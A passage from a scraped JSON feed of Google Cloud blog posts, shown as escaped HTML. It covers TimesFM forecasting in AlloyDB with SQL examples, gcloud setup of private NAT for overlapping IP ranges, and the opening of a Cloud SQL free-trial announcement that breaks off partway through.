class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"4\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/4_xf5tj9r.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h2><strong style=\"vertical-align: baseline;\">TimesFM in AlloyDB</strong></h2>\n<p><a href=\"https://cloud.google.com/alloydb/docs/ai/perform-time-series-forecasting\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">AI.FORECAST</strong><span style=\"text-decoration: underline; vertical-align: baseline;\"> </span></a><span style=\"vertical-align: baseline;\">is now available in </span><strong style=\"vertical-align: baseline;\">AlloyDB in preview</strong><span style=\"vertical-align: baseline;\">. AlloyDB provides built-in support for TimesFM for predictions directly from inside of AlloyDB. This enables you to make predictions leveraging operational and analytical data for use cases such as sales forecasting, inventory demand prediction, or operational load modeling, without needing to export data. </span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"5\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/5_p91Sjwz.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Forecasting sales with AlloyDB</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Let’s walk through an example of how you can forecast sales leveraging data stored in AlloyDB. Traditionally you would have to set up and maintain an ETL pipeline to extract data from AlloyDB, pull it into a data science environment, potentially deploy a forecasting model, run predictions for the model and store them. But for time-sensitive applications, these steps can be costly. </span></p>\n<p><span style=\"vertical-align: baseline;\">Instead, suppose you are leveraging AlloyDB for your operational workloads. You have stored sales, stock and price data, along with metadata, in a table retail_sales. You know what happened </span><span style=\"font-style: italic; vertical-align: baseline;\">last</span><span style=\"vertical-align: baseline;\"> week in terms of sales, but you want to predict what will happen next week so that you can plan accordingly to the demand.</span></p></div>\n<div class=\"block-video\">\n\n\n\n<div class=\"article-module article-video \">\n  <figure>\n    <a class=\"h-c-video h-c-video--marquee\" href=\"https://youtube.com/watch?v=gXShaMxfuog\">\n\n      \n        \n\n        <div class=\"article-video__aspect-image\">\n          <span class=\"h-u-visually-hidden\">Forecast predictions on your operational data with AlloyDB AI</span>\n        </div>\n      \n      <svg class=\"h-c-video__play h-c-icon h-c-icon--color-white\" xmlns=\"http://www.w3.org/2000/svg\">\n        <use xlink:href=\"#mi-youtube-icon\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n      </svg>\n    </a>\n\n    \n  </figure>\n</div>\n\n<div class=\"h-c-modal--video\">\n   <a class=\"glue-yt-video\" href=\"https://youtube.com/watch?v=gXShaMxfuog\">\n   </a>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">With AlloyDB’s latest integration, you can get started with just two simple steps. </span></p>\n<p><strong style=\"vertical-align: baseline;\">1. Register the model. </strong><a href=\"https://cloud.google.com/alloydb/docs/ai/register-model-endpoint\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Register the TimesFM model</span></a><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">as a model endpoint within AlloyDB’s model endpoint management in order to point to the Vertex AI endpoint where the model is hosted. This allows AlloyDB to securely send time-series data to the model and receive predictions back. Here we point to a TimesFM model deployed on Vertex AI and choose a model id “timesfm_v2”. </span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &quot;CALL\\r\\n  ai.create_model(\\r\\n    model_id =&gt; &#x27;timesfm_v2&#x27;,\\r\\n    model_type =&gt; &#x27;ts_forecasting&#x27;,\\r\\n    model_provider =&gt; &#x27;google&#x27;,\\r\\n    model_qualified_name =&gt; &#x27;timesfm_v2&#x27;,\\r\\n    model_request_url =&gt; ‘https://&lt;REGION&gt;-aiplatform.googleapis.com/v1/projects/&lt;PROJECT_ID&gt;/locations/&lt;REGION&gt;/endpoints/&lt;ENDPOINT_ID&gt;:predict’ -- endpoint in Vertex AI Model Garden\\r\\n);&quot;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f5bc527ca00&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">2. Generate Predictions with </strong><strong style=\"vertical-align: baseline;\">AI.FORECAST.</strong><span style=\"vertical-align: baseline;\">Once the model is registered, you can start leveraging the </span><code style=\"vertical-align: baseline;\">AI.FORECAST</code><span style=\"vertical-align: baseline;\"> function. This function takes your time-series data and prediction parameters (like the forecast horizon) and returns the forecasted values.</span></p>\n<p><span style=\"vertical-align: baseline;\">In this example, we'll forecast the next 11 days of sales based on the  sales data stored in our database with a confidence level of .80.</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &quot;SELECT * FROM ai.forecast(\\r\\n  model_id =&gt; &#x27;timesfm_v2&#x27;,\\r\\n  source_table =&gt; &#x27;retail_sales&#x27;,\\r\\n  data_col =&gt; &#x27;sales&#x27;,\\r\\n  timestamp_col =&gt; &#x27;timestamp&#x27;,\\r\\n  horizon =&gt; 11,\\r\\n  conf_level =&gt; 0.8\\r\\n);&quot;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f5bc527c5e0&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"6\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/6_d9WoQQV.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This integrated approach means you can keep your data securely within your high-performance AlloyDB instance and immediately leverage Google’s state-of-the-art forecasting capabilities. The low latency of AlloyDB, combined with the zero-shot power of TimesFM, makes real-time predictive analytics a reality for your operational workloads. Read more about our integration in </span><a href=\"https://medium.com/@vkanishk_85980/zero-shot-time-series-forecasting-in-alloydb-with-googles-timesfm-dc5c2afe65ec\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">this blog post</span></a><span style=\"vertical-align: baseline;\">. </span></p>\n<h2><strong style=\"vertical-align: baseline;\">AI.FORECAST in Agents and MCP</strong></h2>\n<p><span style=\"vertical-align: baseline;\">In addition to supporting TimesFM (AI.FORECAST) via a SQL interface, you can leverage TimesFM’s prediction capabilities on BigQuery and AlloyDB via agentic interfaces such as Agent Development Kit (ADK), MCP toolbox for Databases, and the Gemini CLI extension for Google Data Cloud. </span></p>\n<h3><strong style=\"vertical-align: baseline;\">Use BigQuery built-in forecast tool</strong></h3>\n<p><span style=\"vertical-align: baseline;\">This </span><a href=\"https://cloud.google.com/blog/products/data-analytics/ai-based-forecasting-and-analytics-in-bigquery-via-mcp-and-adk?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">blog post</span></a><span style=\"vertical-align: baseline;\"> shows you how to write your agent with ADK’s built-in BigQuery forecast tool (via TimesFM) to do the forecast task with your data. Here is a quick peek of how you can run forecasting task via natural language with an agent built with ADK:</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"7\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/7_CBQGBIl.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This </span><a href=\"https://cloud.google.com/blog/products/databases/gemini-cli-extensions-for-google-data-cloud?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">blog post</span></a><span style=\"vertical-align: baseline;\"> can walk you through how to install and configure the MCP extension and use the BigQuery forecast tool in the Gemini CLI.</span></p>\n<h2><strong style=\"vertical-align: baseline;\">Take the next step</strong></h2>\n<p><span style=\"vertical-align: baseline;\">The TimesFM model is now generally available in BigQuery. For more details, please see the </span><a href=\"https://cloud.google.com/bigquery/docs/timesfm-time-series-forecasting-tutorial\"><span style=\"text-decoration: underline; vertical-align: baseline;\">tutorial</span></a><span style=\"vertical-align: baseline;\"> and the documentation for</span><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/bigqueryml-syntax-ai-forecast\"><span style=\"text-decoration: underline; vertical-align: baseline;\"> AI.FORECAST</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://docs.cloud.google.com/bigquery/docs/reference/standard-sql/bigqueryml-syntax-ai-evaluate\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI.EVALUTE</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://docs.cloud.google.com/bigquery/docs/reference/standard-sql/bigqueryml-syntax-ai-detect-anomalies\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI.DETECT_ANOMALIES</span></a><span style=\"vertical-align: baseline;\">.  You can also </span><a href=\"https://docs.cloud.google.com/alloydb/docs/ai/perform-time-series-forecasting\"><span style=\"text-decoration: underline; vertical-align: baseline;\">get started on TimesFM</span></a><span style=\"vertical-align: baseline;\"> today on AlloyDB.</span></p></div>",
        "published_date": "2025-11-18 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/networking/using-private-nat-for-networks-with-overlapping-ip-spaces/",
        "title": "Conquering IP address scarcity: A deep dive into Google Cloud's private NAT",
        "thumbnail": null,
        "author": "Udit Bhatia",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Running AI workloads in a hybrid fashion — in your data center and in the cloud — requires sophisticated, global networks that unify cloud and on-premises resources. While Google’s Cloud WAN provides the necessary unified network fabric to connect VPCs, data centers, and specialized hardware, this very interconnectedness exposes a critical, foundational challenge: IP address scarcity and overlapping subnets. As enterprises unify their private and cloud environments, manually resolving these pervasive address conflicts can be a big operational burden.</span></p>\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Resolving IPv4 address conflicts has been a longstanding challenge in networking. And now, with a growing number of IP-intensive workloads and applications, customers face the crucial question of </span><span style=\"font-style: italic; vertical-align: baseline;\">how to ensure sufficient IP addresses for their deployments.</span></p>\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Google Cloud offers various solutions to address private IP address challenges and facilitate communication between non-routable networks, including Private Service Connect (PSC), IPv6 addressing, and network address translation (NAT) appliances. In this post, we focus on private NAT, a feature of the </span><a href=\"https://cloud.google.com/nat\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud NAT</span></a><span style=\"vertical-align: baseline;\"> service. This managed service simplifies private-to-private communication, allowing networks with overlapping IP spaces to connect without complex routing or managing proprietary NAT infrastructure.</span></p>\n<h3 style=\"text-align: justify;\"><strong style=\"vertical-align: baseline;\">Getting to know private NAT</strong></h3>\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Private NAT allows your Google Cloud resources to connect to other VPC networks or to on-premises networks with overlapping and/or non-routable subnets, without requiring you to manage any virtual machines or appliances.</span></p>\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Here are some of the key benefits of private NAT:</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">A managed service:</strong><span style=\"vertical-align: baseline;\"> As a fully managed service, private NAT minimizes the operational burden of managing and scaling your own NAT gateways. Google Cloud handles the underlying infrastructure, so you can focus on your applications.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Simplified management:</strong><span style=\"vertical-align: baseline;\"> Private NAT simplifies network architecture by providing a centralized and straightforward way to manage private-to-private communication — across workloads and traffic paths.</span></li>\n<li><strong style=\"vertical-align: baseline;\">High availability:</strong><span style=\"vertical-align: baseline;\"> Being a distributed service, private NAT offers high availability, VM-to-VM line-rate performance, and resiliency, all without having to over-provision costly, redundant infrastructure.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Scalability:</strong><span style=\"vertical-align: baseline;\"> Private NAT is designed to scale automatically with your needs, supporting a large number of NAT IP addresses and concurrent connections.</span></li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1 Cloud NAT options\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_Cloud_NAT_options.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure: Cloud NAT options</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3 style=\"text-align: justify;\"><strong style=\"vertical-align: baseline;\">Common use cases</strong></h3>\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Private NAT provides critical address translation for the most complex hybrid and multi-VPC networking challenges</span></p>\n<p style=\"text-align: justify;\"><strong style=\"vertical-align: baseline;\">Unifying global networks with Network Connectivity Center</strong></p>\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">For organizations that use Network Connectivity Center to establish a central connectivity hub, private NAT offers the essential mechanism for linking networks that possess overlapping “ non-routable” IP address ranges. This solution facilitates two primary scenarios:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">VPC spoke-to-spoke</strong><span style=\"vertical-align: baseline;\">: Facilitates seamless private-to-private communication between distinct VPC networks (spokes) with overlapping subnets.</span></p>\n</li>\n<li><strong style=\"vertical-align: baseline;\">VPC-to-hybrid-spoke:</strong><span style=\"vertical-align: baseline;\"> Enables connectivity between a cloud VPC and an on-premises network (a hybrid spoke) connected via Cloud Interconnect or Cloud VPN. </span><a href=\"https://cloud.google.com/nat/docs/about-private-nat-for-ncc\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Learn more here</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2 Private NAT with Network Connectivity Center\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_Private_NAT_with_Network_Connectivity_Ce.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure: Private NAT with Network Connectivity Center</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p style=\"text-align: justify;\"><strong style=\"vertical-align: baseline;\">Enabling local hybrid connectivity in shared VPC</strong></p>\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Organizations with shared VPC architectures can establish connectivity from non-routable or overlapping network subnets to their local Cloud Interconnects or Cloud VPN tunnels. A single private NAT gateway can manage destination routes for all workloads within the VPC.</span></p>\n<p style=\"padding-left: 40px;\"><span style=\"font-style: italic; vertical-align: baseline;\">“Thanks to private NAT, we effortlessly connected our Orange on-prem data center with the Masmovil GCP environment, even with IP address overlaps after our joint venture. This was crucial for business continuity, as it allowed us to enable communications without altering our existing environment.” </span><span style=\"vertical-align: baseline;\">– Pedro Sanz Martínez, Head of Cloud Platform Engineering, MasOrange</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"3 Enabling local hybrid connectivity using private NAT\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/3_Enabling_local_hybrid_connectivity_using_private_NAT.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure: Enabling local hybrid connectivity using private NAT</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p style=\"text-align: justify;\"><strong style=\"vertical-align: baseline;\">Accommodating Cloud Run and GKE workloads</strong></p>\n<p><span style=\"vertical-align: baseline;\">Dynamic, IP-intensive workloads such as </span><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/how-class-e-addresses-solve-for-ip-address-exhaustion-in-gke?e=13802955\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Kubernetes Engine</span></a><span style=\"vertical-align: baseline;\"> (GKE) and </span><a href=\"https://cloud.google.com/run/docs/configuring/networking-best-practices#non-rfc-1918\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Run</span></a><span style=\"vertical-align: baseline;\"> often use Non-RFC 1918 ranges such as Class E to solve for IPv4 exhaustion. These workloads often need to access resources in an on-premises network or a partner VPC, so the ability for the on-premises network to accept non-RFC 1918 ranges is critical. In most cases, central network teams do not accept non-RFC 1918 address ranges.</span></p>\n<p><span style=\"vertical-align: baseline;\">You can solve this by applying a private NAT configuration to the non-RFC 1918 subnet. With private NAT, all egress traffic from your Cloud Run service or GKE workloads is translated, allowing it to securely communicate with the destination network despite being on non-routable subnets. Learn about how private NAT works with different workloads </span><a href=\"https://cloud.google.com/nat/docs/nat-product-interactions\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<h3 style=\"text-align: justify;\"><strong style=\"vertical-align: baseline;\">Configuration in action: Example setups</strong></h3>\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Let's look at how to configure private NAT for one of these use cases using </span><code style=\"vertical-align: baseline;\">gcloud</code><span style=\"vertical-align: baseline;\"> commands.</span></p>\n<p style=\"text-align: justify;\"><strong style=\"vertical-align: baseline;\">Example: connecting to a partner network with overlapping IPs</strong></p>\n<p><strong style=\"vertical-align: baseline;\">Scenario:</strong><span style=\"vertical-align: baseline;\"> Your </span><code style=\"vertical-align: baseline;\">production-vpc</code><span style=\"vertical-align: baseline;\"> contains an application subnet (</span><code style=\"vertical-align: baseline;\">app-subnet-prod</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">10.20.0.0/24</code><span style=\"vertical-align: baseline;\">). You need to connect to a partner's network over Cloud VPN, but the partner also uses the </span><code style=\"vertical-align: baseline;\">10.20.0.0/24</code><span style=\"vertical-align: baseline;\"> range for the resources you need to access.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Solution:</strong><span style=\"vertical-align: baseline;\"> Configure a private NAT gateway to translate traffic from </span><code style=\"vertical-align: baseline;\">app-subnet-prod</code><span style=\"vertical-align: baseline;\"> before it goes over the VPN tunnel.</span></p>\n<p><span style=\"vertical-align: baseline;\">1. </span><strong style=\"vertical-align: baseline;\">Create a dedicated subnet for NAT IPs.</strong><span style=\"vertical-align: baseline;\"> This subnet's range is used for translation and must not overlap with the source or destination.</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;gcloud compute networks subnets create pnat-subnet-prod \\\\\\r\\n    --network=production-vpc \\\\\\r\\n    --range=192.168.1.0/24 \\\\\\r\\n    --region=us-central1 \\\\\\r\\n    --purpose=PRIVATE_NAT&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f5bc5f56d90&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p>2. <strong style=\"vertical-align: baseline;\">Create a Cloud Router</strong></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;gcloud compute routers create prod-router \\\\\\r\\n    --network=production-vpc \\\\\\r\\n    --region=us-central1&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f5bc008b9a0&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p>3. <strong style=\"vertical-align: baseline;\">Create a private NAT gateway.</strong><span style=\"vertical-align: baseline;\"> This configuration specifies that only traffic from </span><code style=\"vertical-align: baseline;\">app-subnet-prod</code><span style=\"vertical-align: baseline;\"> to local dynamic (</span><span style=\"font-style: italic; vertical-align: baseline;\">match is_hybrid</span><span style=\"vertical-align: baseline;\">) destinations should be translated using IPs from </span><code style=\"vertical-align: baseline;\">pnat-subnet-prod</code><span style=\"vertical-align: baseline;\"> subnet.</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &quot;gcloud compute routers nats create pnat-to-partner \\\\\\r\\n    --router=prod-router \\\\\\r\\n    --region=us-central1 \\\\\\r\\n    --type=PRIVATE --region=us-central1 \\\\\\r\\n    --nat-custom-subnet-ip-ranges=app-subnet-prod:ALL\\r\\n\\r\\ngcloud compute routers nats rules create 1 \\\\\\r\\n    --router=prod-router --region=us-central1 \\\\\\r\\n    --nat= pnat-to-partner \\\\\\r\\n    --match=&#x27;nexthop.is_hybrid&#x27; \\\\\\r\\n    --source-nat-active-ranges= pnat-subnet-prod&quot;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f5bc5b144f0&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Now, any VM in </span><code style=\"vertical-align: baseline;\">app-subnet-prod</code><span style=\"vertical-align: baseline;\"> that sends traffic to the partner's overlapping network will have its source IP translated to an address from the </span><code style=\"vertical-align: baseline;\">192.168.1.0/24</code><span style=\"vertical-align: baseline;\"> range, resolving the conflict.</span></p>\n<p><span style=\"vertical-align: baseline;\">Google Cloud's private NAT elegantly solves the common and complex problem of connecting networks with overlapping IP address spaces. As a fully managed, scalable, and highly available service, it simplifies network architecture, reduces operational overhead, and enables you to build and connect complex hybrid and multi-cloud environments with ease.</span></p>\n<h3 style=\"text-align: justify;\"><strong style=\"vertical-align: baseline;\">Learn more</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Ready to get started with private NAT? Check out the official </span><a href=\"https://cloud.google.com/nat/docs/private-nat\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">private NAT documentation</strong></a><span style=\"vertical-align: baseline;\"> and tutorials to learn more and start building your own solutions today.</span></p></div>",
        "published_date": "2025-11-18 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/databases/launching-a-new-cloud-sql-30-day-free-trial-instance/",
        "title": "Announcing Cloud SQL free trial instances: Experience the power of a fully managed database",
        "thumbnail": null,
        "author": "Subra Chandramouli",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Cloud SQL is a proven foundation for fully managed databases, offering production-ready </span><strong style=\"vertical-align: baseline;\">MySQL, PostgreSQL, and SQL Server</strong><span style=\"vertical-align: baseline;\"> database engines without the operational headache. With Cloud SQL, there’s no need to worry about patches, backups, and scaling limits — just connect your app and start building.</span></p>\n<p><span style=\"vertical-align: baseline;\">Today, we’re announcing new free trial instances designed to help you experience the power of Cloud SQL for MySQL and PostgreSQL, with no upfront commitment. Whether you're a seasoned Google Cloud developer or new to the platform, this 30-day free trial allows you to explore, test, and truly understand the value Cloud SQL brings to your database needs.</span></p>\n<p><span style=\"vertical-align: baseline;\">There are two editions of Cloud SQL currently available:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Cloud SQL Enterprise Plus edition:</strong><span style=\"vertical-align: baseline;\"> Designed for </span><strong style=\"vertical-align: baseline;\">mission-critical applications</strong><span style=\"vertical-align: baseline;\">, providing the highest performance and availability with a </span><strong style=\"vertical-align: baseline;\">99.99% SLA</strong><span style=\"vertical-align: baseline;\"> (including maintenance). It features near-zero downtime for planned maintenance, significant performance boosts through </span><strong style=\"vertical-align: baseline;\">Data Cache</strong><span style=\"vertical-align: baseline;\"> (using local SSD), and enhanced write throughput. </span></p>\n</li>\n<li><strong style=\"vertical-align: baseline;\">Cloud SQL Enterprise edition: </strong><span style=\"vertical-align: baseline;\">Suitable for most business applications, offering high availability and managed maintenance with a </span><strong style=\"vertical-align: baseline;\">99.95% SLA</strong><span style=\"vertical-align: baseline;\">. It offers all the core capabilities of Cloud SQL, striking a good balance of performance, availability, and cost. </span></li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Cloud SQL Free Trial Instance Get Started\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Cloud_SQL_Free_Trial_Instance_Get_Started.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Cloud SQL Free Trial Instance ‘Get Started’ Page</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Why a dedicated Cloud SQL free trial?</strong></h3>\n<p><span style=\"vertical-align: baseline;\">You might be familiar with the standard $300 Google Cloud free trial for new users. While that's a fantastic starting point, customers have been asking us for a more specialized offering. They want a dedicated environment to test the full power of Cloud SQL, especially enterprise-grade configurations</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">for </span><strong style=\"vertical-align: baseline;\">Performance, High Availability (HA), and Data Cache</strong><span style=\"vertical-align: baseline;\">. This new trial is our answer.</span></p>\n<p><span style=\"vertical-align: baseline;\">This trial provides a significantly enhanced experience for customers developing applications on top of Cloud SQL, allowing you to:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Experience enterprise-grade features:</strong><span style=\"vertical-align: baseline;\"> Test critical functionality like High Availability and Data Cache, both essential to robust and performant database operations.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Onboard new users:</strong><span style=\"vertical-align: baseline;\"> As a developer, get hands-on with Cloud SQL without the usual hurdle of getting expense approvals for running tests.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Perform preliminary performance testing:</strong><span style=\"vertical-align: baseline;\"> Evaluate Cloud SQL's performance for your specific workloads, ensuring it meets your demands.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">This new Cloud SQL free trial is designed for a wide range of users:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Existing Google Cloud customers: </strong><span style=\"vertical-align: baseline;\">If you're already using other Google Cloud products, but haven't explored Cloud SQL,</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">this is your chance!</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">New Google Cloud users:</strong><span style=\"vertical-align: baseline;\"> Complementing the existing standard $300 trial, this offers a deeper dive into Cloud SQL's capabilities.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">What's included in the 30-day free trial?</strong></h3>\n<p><span style=\"vertical-align: baseline;\">We want you to get a comprehensive understanding of Cloud SQL's key value pillars: </span><strong style=\"vertical-align: baseline;\">price-performance, high availability, connectivity, security, observability, ease of manageability, </strong><span style=\"vertical-align: baseline;\">and</span><strong style=\"vertical-align: baseline;\"> open-source compatibility.</strong><span style=\"vertical-align: baseline;\"> Your free trial instance will be configured to help you explore all of these areas, based on the following database instance:<br /></span></p>\n<div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"> 